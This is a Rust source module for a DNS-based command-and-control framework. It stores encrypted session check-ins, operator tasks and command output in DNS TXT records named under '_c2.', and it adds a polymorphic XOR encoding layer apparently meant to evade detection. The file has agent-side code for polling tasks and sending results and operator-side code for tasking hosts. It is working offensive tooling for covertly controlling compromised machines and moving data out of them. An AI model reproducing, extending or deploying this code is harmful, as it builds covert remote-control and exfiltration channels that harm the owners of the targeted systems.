pub mod commands;

use crate::crypto::{self, CryptoError, EncryptionKey};
use crate::dns::{DnsBackend, DnsError};
use base64::Engine;
use log::warn;
use serde::{Deserialize, Serialize};
use thiserror::Error;

const C2_TTL: u32 = 60;
/// Max cleartext bytes that fit in one encrypted+base64 TXT record (under 2048 limit).
/// 1500 plaintext → +28 (nonce+tag) → 1528 → base64 → ~2040. Safe.
const MAX_SINGLE_CLEARTEXT: usize = 1500;

#[derive(Error, Debug)]
pub enum C2Error {
    #[error("DNS error: {0}")]
    Dns(#[from] DnsError),
    #[error("crypto error: {0}")]
    Crypto(#[from] CryptoError),
    #[error("serialization error: {0}")]
    Serde(#[from] serde_json::Error),
    #[error("no pending task")]
    NoPendingTask,
    #[error("session not found: {0}")]
    SessionNotFound(String),
    #[error("{0}")]
    Other(String),
}

// ─── Data types ───

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionInfo {
    pub session_id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    pub first_seen: u64,
    pub last_seen: u64,
}

impl std::fmt::Display for SessionInfo {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let age = now().saturating_sub(self.last_seen);
        let ago = if age < 60 { format!("{}s", age) }
        else if age < 3600 { format!("{}m", age / 60) }
        else { format!("{}h", age / 3600) };
        write!(f, "{:<12} {}@{} ({}/{}) pid={} last={}ago",
            self.session_id, self.username, self.hostname,
            self.os, self.arch, self.pid, ago)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Task {
    pub task_id: String,
    pub command: String,
    pub args: Vec<String>,
    pub timestamp: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum TaskStatus {
    #[serde(rename = "success")]
    Success,
    #[serde(rename = "error")]
    Error,
}

impl std::fmt::Display for TaskStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            TaskStatus::Success => write!(f, "success"),
            TaskStatus::Error => write!(f, "error"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResponse {
    pub task_id: String,
    pub status: TaskStatus,
    pub output: String,
    pub timestamp: u64,
}

// ─── Record naming ───

fn session_record(session_id: &str, domain: &str) -> String {
    format!("_c2.s.{session_id}.{domain}")
}

fn task_record(session_id: &str, domain: &str) -> String {
    format!("_c2.t.{session_id}.{domain}")
}

fn response_record(task_id: &str, session_id: &str, domain: &str) -> String {
    format!("_c2.r.{task_id}.{session_id}.{domain}")
}

fn response_chunk_record(idx: usize, task_id: &str, session_id: &str, domain: &str) -> String {
    format!("_c2.rc.{idx}.{task_id}.{session_id}.{domain}")
}

// ─── Encrypted record helpers ───

/// Encoder descriptor byte: first byte of encrypted blob indicates encoding.
/// 0x00 = no polymorphic encoding (ChaCha20 only)
/// 0x01 = light encoder chain (XOR rolling)
/// 0x02 = medium encoder chain (XOR + dead bytes + chunk reverse)
const ENC_NONE: u8 = 0x00;
const ENC_LIGHT: u8 = 0x01;
const ENC_MEDIUM: u8 = 0x02;

fn encrypt_to_b64(key: &EncryptionKey, plaintext: &[u8]) -> Result<String, C2Error> {
    let encrypted = crypto::encrypt(key, plaintext)?;
    Ok(base64::engine::general_purpose::STANDARD.encode(&encrypted))
}

fn decrypt_from_b64(key: &EncryptionKey, b64: &str) -> Result<Vec<u8>, C2Error> {
    let encrypted = base64::engine::general_purpose::STANDARD.decode(b64)
        .map_err(|e| C2Error::Other(format!("base64 decode: {e}")))?;
    Ok(crypto::decrypt(key, &encrypted)?)
}

/// Encrypt JSON with optional polymorphic encoding layer.
/// Format: [encoder_descriptor: 1 byte] [encode_keys_len: 2 bytes LE] [encode_keys_json] [encrypted_json]
fn encrypt_json_encoded<T: Serialize>(key: &EncryptionKey, value: &T, encode: bool) -> Result<String, C2Error> {
    let json = serde_json::to_vec(value)?;

    if !encode {
        // Legacy path: no encoding, just encrypt
        let mut payload = vec![ENC_NONE];
        payload.extend_from_slice(&json);
        return encrypt_to_b64(key, &payload);
    }

    // Apply polymorphic encoding before encryption
    let chain = crate::encoder::EncoderChain::light();
    let encoded = chain.encode(&json)
        .map_err(|e| C2Error::Other(format!("encoder: {e}")))?;

    // Serialize decode keys so the receiver can reverse the encoding
    let keys_json = serde_json::to_vec(&encoded.decode_keys)
        .map_err(|e| C2Error::Other(format!("encode keys serialize: {e}")))?;
    let keys_len = keys_json.len() as u16;

    let mut payload = Vec::with_capacity(3 + keys_json.len() + encoded.data.len());
    payload.push(ENC_LIGHT);
    payload.extend_from_slice(&keys_len.to_le_bytes());
    payload.extend_from_slice(&keys_json);
    payload.extend_from_slice(&encoded.data);

    encrypt_to_b64(key, &payload)
}

/// Decrypt JSON, reversing any polymorphic encoding.
fn decrypt_json_encoded<T: for<'de> Deserialize<'de>>(key: &EncryptionKey, b64: &str) -> Result<T, C2Error> {
    let plaintext = decrypt_from_b64(key, b64)?;
    if plaintext.is_empty() {
        return Err(C2Error::Other("empty decrypted payload".into()));
    }

    let descriptor = plaintext[0];
    let json_bytes = match descriptor {
        ENC_NONE => {
            // No encoding — rest is raw JSON
            &plaintext[1..]
        }
        ENC_LIGHT | ENC_MEDIUM => {
            // Polymorphic encoding — extract keys and decode
            if plaintext.len() < 4 {
                return Err(C2Error::Other("encoded payload too short".into()));
            }
            let keys_len = u16::from_le_bytes([plaintext[1], plaintext[2]]) as usize;
            if 3 + keys_len > plaintext.len() {
                return Err(C2Error::Other("keys length exceeds payload".into()));
            }
            let keys_json = &plaintext[3..3 + keys_len];
            let encoded_data = &plaintext[3 + keys_len..];

            let decode_keys: Vec<Vec<u8>> = serde_json::from_slice(keys_json)
                .map_err(|e| C2Error::Other(format!("decode keys parse: {e}")))?;

            let chain = match descriptor {
                ENC_LIGHT => crate::encoder::EncoderChain::light(),
                ENC_MEDIUM => crate::encoder::EncoderChain::medium(),
                _ => unreachable!(),
            };

            let encoded_payload = crate::encoder::EncodedPayload {
                data: encoded_data.to_vec(),
                decode_keys,
                num_passes: chain.passes.len() as u32,
            };

            let decoded = chain.decode(&encoded_payload)
                .map_err(|e| C2Error::Other(format!("decoder: {e}")))?;

            return Ok(serde_json::from_slice(&decoded)?);
        }
        other => {
            // Unknown descriptor — try as legacy (no descriptor byte)
            warn!("unknown encoder descriptor 0x{:02x}, trying legacy decode", other);
            &plaintext[..]
        }
    };

    Ok(serde_json::from_slice(json_bytes)?)
}

// Backward-compatible wrappers used by existing code paths
fn encrypt_json<T: Serialize>(key: &EncryptionKey, value: &T) -> Result<String, C2Error> {
    encrypt_json_encoded(key, value, false)
}

fn decrypt_json<T: for<'de> Deserialize<'de>>(key: &EncryptionKey, b64: &str) -> Result<T, C2Error> {
    decrypt_json_encoded(key, b64)
}

// ─── Agent-side operations ───

/// Register a new session.
pub async fn check_in(
    backend: &dyn DnsBackend,
    domain: &str,
    key: &EncryptionKey,
    info: &SessionInfo,
) -> Result<(), C2Error> {
    let name = session_record(&info.session_id, domain);
    let content = encrypt_json(key, info)?;
    backend.create_record(&name, &content, C2_TTL).await?;
    Ok(())
}

/// Update last_seen timestamp.
pub async fn heartbeat(
    backend: &dyn DnsBackend,
    domain: &str,
    key: &EncryptionKey,
    session_id: &str,
) -> Result<(), C2Error> {
    let name = session_record(session_id, domain);
    let records = backend.get_records(&name).await?;
    if let Some(record) = records.first() {
        let mut info: SessionInfo = decrypt_json(key, &record.content)?;
        info.last_seen = now();
        let content = encrypt_json(key, &info)?;
        if let Some(id) = &record.id {
            backend.update_record(id, &content).await?;
        }
    }
    Ok(())
}

/// Poll for a pending task.
pub async fn poll_task(
    backend: &dyn DnsBackend,
    domain: &str,
    key: &EncryptionKey,
    session_id: &str,
) -> Result<Option<Task>, C2Error> {
    let name = task_record(session_id, domain);
    match backend.get_records(&name).await {
        Ok(records) if !records.is_empty() => {
            let task: Task = decrypt_json(key, &records[0].content)?;
            Ok(Some(task))
        }
        Ok(_) => Ok(None),
        Err(DnsError::NotFound(_)) => Ok(None),
        Err(e) => Err(C2Error::Dns(e)),
    }
}

/// Delete the task record after execution.
pub async fn clear_task(
    backend: &dyn DnsBackend,
    domain: &str,
    session_id: &str,
) -> Result<(), C2Error> {
    let name = task_record(session_id, domain);
    let records = backend.get_records(&name).await?;
    for r in &records {
        if let Some(id) = &r.id {
            backend.delete_record(id).await?;
        }
    }
    Ok(())
}

/// Submit a task response, chunking large outputs across multiple TXT records.
pub async fn submit_response(
    backend: &dyn DnsBackend,
    domain: &str,
    key: &EncryptionKey,
    session_id: &str,
    response: &TaskResponse,
) -> Result<(), C2Error> {
    let json = serde_json::to_vec(response)?;
    let base_name = response_record(&response.task_id, session_id, domain);

    if json.len() <= MAX_SINGLE_CLEARTEXT {
        let content = encrypt_to_b64(key, &json)?;
        backend.create_record(&base_name, &content, C2_TTL).await?;
    } else {
        // Chunk: encrypt the full JSON, base64 encode, split across records
        let encrypted = crypto::encrypt(key, &json)?;
        let encoded = base64::engine::general_purpose::STANDARD.encode(&encrypted);
        let chunk_size = 1800; // base64 chars per record
        let chunks: Vec<&str> = encoded.as_bytes()
            .chunks(chunk_size)
            .map(|c| std::str::from_utf8(c).unwrap())
            .collect();

        // Header record: chunk count marker
        backend.create_record(&base_name, &format!("chunks:{}", chunks.len()), C2_TTL).await?;

        // Chunk records
        for (i, chunk) in chunks.iter().enumerate() {
            let name = response_chunk_record(i, &response.task_id, session_id, domain);
            backend.create_record(&name, chunk, C2_TTL).await?;
        }
    }
    Ok(())
}

// ─── Operator-side operations ───

/// List all active sessions.
pub async fn list_sessions(
    backend: &dyn DnsBackend,
    domain: &str,
    key: &EncryptionKey,
) -> Result<Vec<SessionInfo>, C2Error> {
    let records = backend.list_records("_c2.s.").await?;
    let mut sessions = Vec::new();
    for r in &records {
        // Filter to records for this domain
        if !r.name.ends_with(domain) { continue; }
        if let Ok(info) = decrypt_json::<SessionInfo>(key, &r.content) {
            sessions.push(info);
        }
    }
    sessions.sort_by(|a, b| b.last_seen.cmp(&a.last_seen));
    Ok(sessions)
}

/// Send a task to a session.
pub async fn send_task(
    backend: &dyn DnsBackend,
    domain: &str,
    key: &EncryptionKey,
    session_id: &str,
    task: &Task,
) -> Result<(), C2Error> {
    // Verify session exists
    let sess_name = session_record(session_id, domain);
    let sess_records = backend.get_records(&sess_name).await?;
    if sess_records.is_empty() {
        return Err(C2Error::SessionNotFound(session_id.to_string()));
    }

    let name = task_record(session_id, domain);
    let content = encrypt_json(key, task)?;
    backend.create_record(&name, &content, C2_TTL).await?;
    Ok(())
}

/// Read a task response, handling chunked responses.
pub async fn read_response(
    backend: &dyn DnsBackend,
    domain: &str,
    key: &EncryptionKey,
    session_id: &str,
    task_id: &str,
) -> Result<Option<TaskResponse>, C2Error> {
    let base_name = response_record(task_id, session_id, domain);
    let records = backend.get_records(&base_name).await?;

    if records.is_empty() {
        return Ok(None);
    }

    let content = &records[0].content;

    if let Some(count_str) = content.strip_prefix("chunks:") {
        // Chunked response — reassemble
        let n: usize = count_str.parse()
            .map_err(|e| C2Error::Other(format!("chunk count parse: {e}")))?;

        let mut encoded = String::new();
        for i in 0..n {
            let chunk_name = response_chunk_record(i, task_id, session_id, domain);
            let chunk_records = backend.get_records(&chunk_name).await?;
            if chunk_records.is_empty() {
                return Err(C2Error::Other(format!("missing response chunk {i}")));
            }
            encoded.push_str(&chunk_records[0].content);
        }

        let encrypted = base64::engine::general_purpose::STANDARD.decode(&encoded)
            .map_err(|e| C2Error::Other(format!("base64 decode: {e}")))?;
        let json = crypto::decrypt(key, &encrypted)?;
        Ok(Some(serde_json::from_slice(&json)?))
    } else {
        // Single record response
        Ok(Some(decrypt_json(key, content)?))
    }
}

/// Wait for a response by polling.
pub async fn wait_for_response(
    backend: &dyn DnsBackend,
    domain: &str,
    key: &EncryptionKey,
    session_id: &str,
    task_id: &str,
    timeout_secs: u64,
) -> Result<TaskResponse, C2Error> {
    let start = std::time::Instant::now();
    let poll_interval = std::time::Duration::from_secs(2);

    loop {
        if let Some(resp) = read_response(backend, domain, key, session_id, task_id).await? {
            return Ok(resp);
        }

        if start.elapsed().as_secs() > timeout_secs {
            return Err(C2Error::Other(format!(
                "timeout after {}s waiting for response to task {}", timeout_secs, task_id
            )));
        }

        tokio::time::sleep(poll_interval).await;
    }
}

pub fn generate_task_id() -> String {
    let mut bytes = [0u8; 6];
    rand::RngCore::fill_bytes(&mut rand::rngs::OsRng, &mut bytes);
    hex::encode(bytes)
}

pub fn generate_session_id() -> String {
    let mut bytes = [0u8; 6];
    rand::RngCore::fill_bytes(&mut rand::rngs::OsRng, &mut bytes);
    hex::encode(bytes)
}

fn now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}
